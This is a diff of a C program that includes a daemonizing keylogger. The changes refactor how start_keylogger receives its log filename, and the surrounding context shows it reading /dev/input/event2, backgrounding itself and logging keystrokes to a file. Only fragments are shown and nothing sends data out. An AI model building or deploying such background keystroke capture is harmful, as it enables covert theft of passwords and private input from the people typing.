@@ -58,7 +58,6 @@ int main(int argc, char *argv[])
     return 0;
 }
 
-
 void file_operations(int mode, char *filename)
 {
     int fd;
@@ -179,7 +178,6 @@ void file_operations(int mode, char *filename)
         fprintf(stderr, "[-] Invalid operation for file operations.\n");
     }
 }
-
 
 void directory_operations(int mode, char *path)
 {
@@ -495,17 +493,7 @@ void daemonize(char *log_filename)
 
 void start_keylogger(char *log_filename)
 {
-
-    char log_filename[256];
-
-    printf("Enter the filename for keylogger log file: ");
-    scanf("%s", log_filename);
-
-    if (strchr(log_filename, '/') != NULL)
-    {
-        fprintf(stderr, "[-] Log filename should not be a path. Please provide a valid filename. Your log file will store in the root directory.\n");
-        exit(EXIT_FAILURE);
-    }
+    printf("[+] Check keylogger PID in the log file: /%s\n", log_filename);
 
     // Open the input device (adjust as needed for your keyboard)
     int fd = open("/dev/input/event2", O_RDONLY);
@@ -515,14 +503,14 @@ void start_keylogger(char *log_filename)
         return;
     }
 
-    printf("[+] Check keylogger PID in the log file: /%s\n", log_filename);
-
     // Set up signal handler
     signal(SIGTERM, stop_keylogger);
     signal(SIGINT, stop_keylogger);
 
     // Daemonize the process
     daemonize(log_filename);
+
+    printf("Keylogger started. Logging keystrokes to %s...\n", log_filename);
 
     // Open the log file in append mode
     log_file = fopen(log_filename, "a");
